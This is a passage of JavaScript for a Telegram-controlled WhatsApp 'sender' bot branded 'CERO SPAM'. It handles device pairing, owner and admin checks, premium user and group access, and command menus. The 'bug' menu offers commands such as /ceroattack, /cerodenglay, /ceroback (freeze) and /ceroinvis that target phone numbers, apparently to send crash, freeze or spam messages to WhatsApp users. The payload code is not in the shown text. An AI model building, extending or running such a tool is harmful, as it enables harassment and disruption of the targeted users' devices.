 ╚═════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
╭──────────────────────────────────────╮
┆ ✅ ID TOKEN BOT VALID SUKSES TERHUBUNG ┆
╰──────────────────────────────────────╯
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'C3RO',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {

        if (lastPairingMessage) {
            const connectedMenu = `
<blockquote><pre>╭──「 𝖢𝖤𝖱𝖮 𝖯𝖠𝖨𝖱𝖨𝖭𝖦 」
│ ⌑ Number : ${lastPairingMessage.phoneNumber}
│ ⌑ Pairing Code : ${lastPairingMessage.pairingCode}
│ ⌑ Type : Connected
╰───────────────</pre></blockquote>`;

            try {
                await bot.telegram.editMessageCaption(
                    lastPairingMessage.chatId,
                    lastPairingMessage.messageId,
                    undefined,
                    connectedMenu,
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: "DEVELOPER",
                                        url: "https://t.me/turrjirrr", 
                                       style: "danger"
                                    }
                                ]
                            ]
                        }
                    }
                );
            } catch (e) {
                console.error("Gagal update pairing:", e.message);
            }
        }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
 ██████╗███████╗██████╗  ██████╗ 
██╔════╝██╔════╝██╔══██╗██╔═══██╗
██║     █████╗  ██████╔╝██║   ██║
██║     ██╔══╝  ██╔══██╗██║   ██║
╚██████╗███████╗██║  ██║╚██████╔╝
 ╚═════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
 
╭────────────────────────────────╮
┆ ✅ SENDER BOT BERHASIL CONNTECT ┆
╰────────────────────────────────╯


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "TURZCHER");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `╭──「 𝖢𝖤𝖱𝖮 𝖯𝖠𝖨𝖱𝖨𝖭𝖦 」
│ ⌑ Number : ${phoneNumber}
│ ⌑ Pairing Code : ${formattedCode}
│ ⌑ Type : Not Connected
╰───────────────`;

const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
  caption: pairingMenu,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
         {
        text: "𝖢𝖮𝖯𝖸 𝖢𝖮𝖣𝖤",
        style: "success",
        copy_text: {
          text: formattedCode
         }
       }
      ]
    ]
  }
});

lastPairingMessage = {
  chatId: ctx.chat.id,
  messageId: sentMsg.message_id,
  phoneNumber,
  pairingCode: formattedCode
};

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
╭──「 𝖢𝖤𝖱𝖮 𝖯𝖠𝖨𝖱𝖨𝖭𝖦 」
│ ⌑ Number: ${lastPairingMessage.phoneNumber}
│ ⌑ Pairing Code: ${lastPairingMessage.pairingCode}
│ ⌑ Type: Connected
╰───────────────`;

      try {
        await bot.telegram.editMessageCaption(
          lastPairingMessage.chatId,
          lastPairingMessage.messageId,
          undefined,
          updateConnectionMenu,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: "𝖣𝖤𝖵𝖤𝖫𝖮𝖯𝖤𝖱",
                    url: "https://t.me/turrjirrr",
                    style: "danger"
                  }
                ]
              ]
            }
          }
        );
      } catch (e) {
      }
    }
  });
}
  } catch (err) {
    console.error("Addbot error:", err);
    await ctx.reply("❌ Gagal mendapatkan pairing code.");
  }
});

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftarkan ID anda menjadi admin");
    }
    next();
};



// ═══════════════════════════════════════════════════════════════════════════
// ─── COMMAND: /setchannel — Set channel force sub (MAX 5) ────────────────
// ═══════════════════════════════════════════════════════════════════════════
bot.command("setchannel", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const username = args[0];

  if (!username) {
    return ctx.reply(`╭──「 𝖢𝖤𝖱𝖮 𝖥𝖮𝖱𝖢𝖤 𝖲𝖴𝖡 」
│• Format : /setchannel @username
│• Contoh : /setchannel @cerochannels
│• Max : 5 channel
╰─────────────`);
  }

  const clean = username.startsWith('@') ? username : `@${username}`;
  const channels = loadChannels();

  if (channels.includes(clean)) {
    return ctx.reply(`⚠️ Channel ${clean} sudah terdaftar.`);
  }

  if (channels.length >= 5) {
    return ctx.reply(
      `╭──「 𝖢𝖤𝖱𝖮 𝖥𝖮𝖱𝖢𝖤 𝖲𝖴𝖡 」
│ ⚠️ BATAS MAKSIMAL (5)
│ Hapus dulu : /delchannel @username
│
│ Daftar saat ini :
 ${channels.map((c, i) => `│${i + 1}. ${c}`).join('\n')}
╰─────────────`
    );
  }

  // Cek bot admin di channel
  try {
    await bot.telegram.getChat(clean);
    const botId = (await bot.telegram.getMe()).id;
    const member = await bot.telegram.getChatMember(clean, botId);
    if (!['administrator', 'creator'].includes(member.status)) {
      return ctx.reply(`❌ Bot harus jadi admin di ${clean} dulu.`);
    }
  } catch (e) {
    return ctx.reply(`❌ Gagal akses ${clean}: ${e.message}`);
  }

  channels.push(clean);
  saveChannels(channels);

  return ctx.reply(
    `╭──「 𝖢𝖤𝖱𝖮 𝖥𝖮𝖱𝖢𝖤 𝖲𝖴𝖡 」
│ ✅ Channel ditambahkan
│ Channel : ${clean}
│ Total : ${channels.length}/5
╰─────────────`
  );
});

// ═══════════════════════════════════════════════════════════════════════════
// ─── COMMAND: /delchannel ────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
bot.command("delchannel", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const username = args[0];

  if (!username) {
    return ctx.reply("🪧 Format: /delchannel @username");
  }

  const clean = username.startsWith('@') ? username : `@${username}`;
  let channels = loadChannels();

  if (!channels.includes(clean)) {
    return ctx.reply(`⚠️ ${clean} tidak ada dalam daftar.`);
  }

  channels = channels.filter((c) => c !== clean);
  saveChannels(channels);

  return ctx.reply(
    `╭──「 𝖢𝖤𝖱𝖮 𝖥𝖮𝖱𝖢𝖤 𝖲𝖴𝖡 」
│ ✅ Channel dihapus
│ Channel : ${clean}
│ Total : ${channels.length}/5
╰─────────────`
  );
});

// ═══════════════════════════════════════════════════════════════════════════
// ─── COMMAND: /listchannel ───────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
bot.command("listchannel", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const channels = loadChannels();

  if (channels.length === 0) {
    return ctx.reply("📋 Belum ada channel terdaftar.");
  }

  const list = channels.map((c, i) => `│${i + 1}. ${c}`).join('\n');

  return ctx.reply(
    `╭──「 𝖢𝖤𝖱𝖮 𝖥𝖮𝖱𝖢𝖤 𝖲𝖴𝖡 」
│📋 LIST CHANNEL
│
${list}
│
│ • Total : ${channels.length}/5
╰─────────────`
  );
});
// --- Fungsi untuk Menambahkan Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync(adminFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveAdmins = (admins) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
    } catch (err) {
    }
};

const addAdmin = (userId) => {
    const admins = loadAdmins();
    admins[userId] = true;
    saveAdmins(admins);
    return true;
};

const removeAdmin = (userId) => {
    const admins = loadAdmins();
    delete admins[userId];
    saveAdmins(admins);
    return true;
};

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.command("blockcmd", async (ctx) => {
  const text = ctx.message.text.split(" ")

  if (!text[1]) {
    return ctx.reply("Format:\n/blockcmd /command")
  }

  const cmd = text[1].replace("/", "")

  blockedCmds.add(cmd)
  saveBlocked()

  ctx.reply(`🚫 Command /${cmd} berhasil diblokir.`)
})

bot.command("unblockcmd", async (ctx) => {
  const text = ctx.message.text.split(" ")

  if (!text[1]) {
    return ctx.reply("Format:\n/unblockcmd /command")
  }

  const cmd = text[1].replace("/", "")

  blockedCmds.delete(cmd)
  saveBlocked()

  ctx.reply(`✅ Command /${cmd} berhasil dibuka.`)
})

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});



const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgb", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgb -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgb", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgb -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addalluser', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addalluser -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delalluser', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delalluser -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

// =========================
// COMMAND START
// =========================
bot.start(async (ctx) => {
  const isOwner = Number(ctx.from.id) === Number(ownerID);
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";

  if (!isOwner) {
    if (ctx.chat.type === "private") {
      bot.telegram.sendMessage(
        ownerID,
        `📩 <b>NOTIF START PRIVATE</b>\n\n` +
        `👤 ${ctx.from.first_name || ctx.from.username}\n` +
        `🆔 <code>${ctx.from.id}</code>\n` +
        `⌚ ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }
  }

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ Grup ini belum terdaftar sebagai GROUP PREMIUM.");
  }

  const menuMessage = `
<blockquote><strong>╭── 「 𝖢𝖤𝖱𝖮 𝖲𝖯𝖠𝖬 」──╮
│ ‹𝟹 Developer : @turrjirrr
│ ‹𝟹 Version : 𝟣.𝟣 𝖭𝖾𝗐
│ ‹𝟹 Prefix : 𝖲𝗅𝖺𝗌𝗁 ( / ) 
│ ‹𝟹 Type : 𝖡𝖾𝖻𝖺𝗌 𝖲𝗉𝖺𝗆 
│ ‹𝟹 Koneksi : ${senderStatus}
╰─────────────────╯</strong></blockquote>`;

  const sent = await ctx.replyWithPhoto(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: buildMainKeyboard(),
  });

  autoColorMessages.set(ctx.chat.id, sent.message_id);
  menuTypeMap.set(ctx.chat.id, "main");
  lastUpdateMap.set(ctx.chat.id, 0);
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  menuTypeMap.set(ctx.chat.id, "main");
  
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";

  const menuMessage = `
<blockquote><strong>╭── 「 𝖢𝖤𝖱𝖮 𝖲𝖯𝖠𝖬 」──╮
│ ‹𝟹 Developer : @turrjirrr
│ ‹𝟹 Version : 𝟣.𝟣 𝖭𝖾𝗐
│ ‹𝟹 Prefix : 𝖲𝗅𝖺𝗌𝗁 ( / ) 
│ ‹𝟹 Type : 𝖡𝖾𝖻𝖺𝗌 𝖲𝗉𝖺𝗆 
│ ‹𝟹 Koneksi : ${senderStatus}
╰─────────────────╯</strong></blockquote>`;

  try {
    await ctx.editMessageMedia({
      type: "photo",
      media: thumbnailUrl,
      caption: menuMessage,
      parse_mode: "HTML",
    }, {
      reply_markup: buildMainKeyboard(),
    });

    autoColorMessages.set(ctx.chat.id, ctx.callbackQuery.message.message_id);
    menuTypeMap.set(ctx.chat.id, "main");
    lastUpdateMap.set(ctx.chat.id, 0);
  } catch (e) {
    if (e.response?.error_code === 400 && e.response.description?.includes("not modified")) {
      await ctx.answerCbQuery();
    }
  }
});

bot.action("/controls", async (ctx) => {
  menuTypeMap.set(ctx.chat.id, "controls");
    
  const controlsMenu = `
<blockquote><strong>╭── 「 𝖢𝖤𝖱𝖮 𝖲𝖯𝖠𝖬 」──╮
│ ‹𝟹 Developer : @turrjirrr
│ ‹𝟹 Version : 𝟣.𝟣 𝖭𝖾𝗐
│ ‹𝟹 Prefix : 𝖲𝗅𝖺𝗌𝗁 ( / ) 
│ ‹𝟹 Type : 𝖡𝖾𝖻𝖺𝗌 𝖲𝗉𝖺𝗆 
╰─────────────────╯</strong></blockquote>

<blockquote><strong>╭──「 𝖲𝖤𝖳𝖳𝖨𝖭𝖦𝖲 𝖡𝖮𝖳 」
│ ‹𝟹 /addbot — 𝖺𝖽𝖽 𝗌𝖾𝗇𝖽𝖾𝗋
│ ‹𝟹 /setcd — 𝗌𝖾𝗍 𝖼𝗈𝗈𝗅𝖽𝗈𝗐𝗇
│ ‹𝟹 /killsesi — 𝗋𝖾𝗌𝖾𝗍 𝗌𝖾𝗌𝗌𝗂𝗈n
╰─────────────────╯</strong></blockquote>
<blockquote><strong>╭──「 𝖲𝖤𝖳𝖳𝖨𝖭𝖦𝖲 𝖢𝖬𝖣 」
│ ‹𝟹 /blockcmd — 𝖻𝗅𝗈𝗄𝗂𝗋 𝖢𝗈𝗆𝗆𝖺𝗇𝖽
│ ‹𝟹 /unblockcmd — 𝖻𝗎𝗄𝖺 𝖻𝗅𝗈𝗄𝗂𝗋
╰─────────────────╯</strong></blockquote>
<blockquote><strong>╭──「 𝖲𝖤𝖳𝖳𝖨𝖭𝖦𝖲 𝖴𝖲𝖤𝖱 」
│ ‹𝟹 /addadmin — 𝖺𝖽𝖽 𝖺𝖽𝗆𝗂𝗇
│ ‹𝟹 /deladmin — 𝖽𝖾𝗅𝖾𝗍𝖾 𝖺𝖽𝗆𝗂𝗇
│ ‹𝟹 /addprem — 𝖽𝖽𝖽 𝗉𝗋𝖾𝗆𝗂𝗎𝗆
│ ‹𝟹 /delprem — 𝖽𝖾𝗅𝖾𝗍𝖾 𝗉𝗋𝖾𝗆𝗂𝗎𝗆
│ ‹𝟹 /addalluser — 𝖺𝖽𝖽 𝗉𝗋𝖾𝗆𝗂𝗎𝗆 𝖺𝗅𝗅 𝗎𝗌𝖾𝗋
│ ‹𝟹 /delalluser — 𝖽𝖾𝗅𝖾𝗍𝖾 𝗉𝗋𝖾𝗆𝗂𝗎𝗆 𝖺𝗅𝗅 𝗎𝗌𝖾𝗋
╰─────────────────╯</strong></blockquote>
<blockquote><strong>╭──「 𝖲𝖤𝖳𝖳𝖨𝖭𝖦𝖲 𝖦𝖱𝖮𝖴𝖯 」
│ ‹𝟹 /addpremgb — 𝖺𝖽𝖽 𝗉𝗋𝖾𝗆𝗂𝗎𝗆 𝗀𝖻
│ ‹𝟹 /delpremgb — 𝖽𝖾𝗅 𝗉𝗋𝖾𝗆𝗂𝗎𝗆 𝗀𝖻
╰─────────────────╯</strong></blockquote>
<blockquote><strong>╭──「 𝖲𝖤𝖳𝖳𝖨𝖭𝖦𝖲 𝖢𝖧𝖠𝖭𝖭𝖤𝖫𝖲 」
│ ‹𝟹 /setchannel — add channel 
│ ‹𝟹 /delchannel — delete channel
│ ‹𝟹 /listchannel — list channel
╰─────────────────╯</strong></blockquote>`;

  try {
    await ctx.editMessageCaption(controlsMenu, {
      parse_mode: "HTML",
      reply_markup: buildBackKeyboard(),
    });
    await ctx.answerCbQuery();

    autoColorMessages.set(ctx.chat.id, ctx.callbackQuery.message.message_id);
    menuTypeMap.set(ctx.chat.id, "controls");
    lastUpdateMap.set(ctx.chat.id, 0);
  } catch (e) {
    if (e.response?.error_code === 400 && e.response.description?.includes("not modified")) {
      await ctx.answerCbQuery();
    }
  }
});

bot.action("/bug", async (ctx) => {
  menuTypeMap.set(ctx.chat.id, "bug");
    
  const bugMenu = `
<blockquote><strong>╭── 「 𝖢𝖤𝖱𝖮 𝖲𝖯𝖠𝖬 」──╮
│ ‹𝟹 Developer : @turrjirrr
│ ‹𝟹 Version : 𝟣.𝟣 𝖭𝖾𝗐
│ ‹𝟹 Prefix : 𝖲𝗅𝖺𝗌𝗁 ( / ) 
│ ‹𝟹 Type : 𝖡𝖾𝖻𝖺𝗌 𝖲𝗉𝖺𝗆 
╰─────────────────╯</strong></blockquote>

<blockquote><strong>╭──「 𝖬𝖤𝖭𝖴 𝖡𝖴𝖦𝖲 」──╮
│ ‹𝟹 /ceroattack 628xxx
│— 𝖼𝖾𝗋𝗈 𝖬𝖾𝗇𝗀𝖺𝗍𝗍𝖺𝖼𝗄
│ ‹𝟹 /cerodenglay 628xxx
│— 𝖣𝖾𝗇𝗀𝗅𝖺𝗒 𝖨𝗇𝗀𝗉𝗂𝗌
│ ‹𝟹 /ceroback 628xxx
│— 𝖥𝗋𝖾𝗓𝖾𝖾 𝖳𝗂𝗉𝗂𝗌 𝖳𝗂𝗉𝗂𝗌
│ ‹𝟹 /ceroinvis 628xxx
│— 𝖨𝗇𝗏𝗂𝗌𝗂𝖻𝗅𝖾 𝖡𝗎𝗀𝗌
│ ‹𝟹 /cerompruy 628xxx
│— 𝖢𝗈𝗆𝖻𝗈 𝖢𝖾𝗋𝗈
╰─────────────────╯</strong></blockquote>`;

  try {
    await ctx.editMessageCaption(bugMenu, {
      parse_mode: "HTML",
      reply_markup: buildBackKeyboard(),
    });
    await ctx.answerCbQuery();

    autoColorMessages.set(ctx.chat.id, ctx.callbackQuery.message.message_id);
    menuTypeMap.set(ctx.chat.id, "bug");
    lastUpdateMap.set(ctx.chat.id, 0);
  } catch (e) {
    if (e.response?.error_code === 400 && e.response.description?.includes("not modified")) {
      await ctx.answerCbQuery();
    }
  }
});

bot.action("/tolos", async (ctx) => {
  menuTypeMap.set(ctx.chat.id, "tolos");
    
  const controlsMenu = `
<blockquote><strong>╭── 「 𝖢𝖤𝖱𝖮 𝖲𝖯𝖠𝖬 」──╮
│ ‹𝟹 Developer : @turrjirrr
│ ‹𝟹 Version : 𝟣.𝟣 𝖭𝖾𝗐
│ ‹𝟹 Prefix : 𝖲𝗅𝖺𝗌𝗁 ( / ) 
│ ‹𝟹 Type : 𝖡𝖾𝖻𝖺𝗌 𝖲𝗉𝖺𝗆 
╰─────────────────╯</strong></blockquote>

<blockquote><strong>╭──「 𝖳𝖮𝖮𝖫𝖲 𝖬𝖤𝖭𝖴 」─╮
│ ‹𝟹 /tiktokdl — 𝖽𝗈𝗐𝗇𝗅𝗈𝖺𝖽 𝗏𝗍 𝗍𝗂𝗄𝗍𝗈𝗄
│ ‹𝟹 /igdl — 𝖽𝗈𝗐𝗇𝗅𝗈𝖺𝗌 𝗏𝗍 𝗂𝗀
│ ‹𝟹 /iqc — 𝗂𝗉𝗁𝗈𝗇𝖾 𝗊𝗎𝗈𝗍𝖾𝖽 𝖼𝗁𝖺𝗍
│ ‹𝟹 /brat — 𝗌𝗍𝗂𝖼𝗄𝖾𝗋 𝗍𝖾𝗄𝗌
│ ‹𝟹 /cuaca — 𝖼𝖾𝗄 𝖼𝗎𝖺𝖼𝖺 𝗄𝗈𝗍𝖺
╰────────────────╯</strong></blockquote>`;

  try {
    await ctx.editMessageCaption(controlsMenu, {
      parse_mode: "HTML",
      reply_markup: buildBackKeyboard(),
    });
    await ctx.answerCbQuery();

    autoColorMessages.set(ctx.chat.id, ctx.callbackQuery.message.message_id);
    menuTypeMap.set(ctx.chat.id, "tolos");
    lastUpdateMap.set(ctx.chat.id, 0);
  } catch (e) {
    if (e.response?.error_code === 400 && e.response.description?.includes("not modified")) {
      await ctx.answerCbQuery();
    }
  }
});

bot.action("/gemes", async (ctx) => {
  menuTypeMap.set(ctx.chat.id, "gemes");
    
  const controlsMenu = `
<blockquote><strong>╭── 「 𝖢𝖤𝖱𝖮 𝖲𝖯𝖠𝖬 」──╮
│ ‹𝟹 Developer : @turrjirrr
│ ‹𝟹 Version : 𝟣.𝟣 𝖭𝖾𝗐
